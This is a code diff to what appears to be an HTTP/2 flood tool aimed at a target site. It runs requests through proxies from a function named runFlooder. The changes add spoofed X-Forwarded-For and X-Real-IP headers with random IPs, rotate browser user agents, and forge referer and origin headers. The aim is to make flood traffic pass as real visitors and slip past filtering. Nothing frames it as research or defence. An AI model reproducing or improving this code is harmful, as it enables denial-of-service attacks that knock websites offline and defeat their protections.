@@ -577,19 +577,46 @@ function getRandomUserAgent() {
  }
  
  headers[":method"] = RaptorMethod;
- headers[":path"] = parsedTarget.path;
- headers[":scheme"] = "https";
- headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
- headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
- headers["accept-encoding"] = "gzip, deflate, br";
- headers["x-forwarded-proto"] = "https";
- headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
- headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
- headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "same-origin";
- headers["upgrade-insecure-requests"] = "1";
+headers[":path"] = parsedTarget.path;
+headers[":scheme"] = "https";
+headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
+headers["accept-encoding"] = "gzip, deflate, br";
+headers["x-forwarded-proto"] = "https";
+headers["x-forwarded-for"] = randomIP();  // Mensimulasikan IP berbeda
+headers["x-real-ip"] = randomIP();  // Alternatif IP
+headers["cache-control"] = "no-cache, no-store, private, max-age=0, must-revalidate";
+headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
+headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "same-origin";
+headers["upgrade-insecure-requests"] = "1";
+headers["referer"] = "https://" + parsedTarget.host + "/";
+headers["origin"] = "https://" + parsedTarget.host;
+headers["user-agent"] = randomUserAgent();  // Menggunakan randomisasi
+
+// Fungsi untuk mendapatkan IP acak
+function randomIP() {
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+    }
+
+// Fungsi untuk mendapatkan User-Agent acak
+function randomUserAgent() {
+    const agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36",
+        "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
+    ];
+    return randomElement(agents);
+    }
+
+// Fungsi untuk memilih elemen secara acak dari array
+function randomElement(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+    }
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
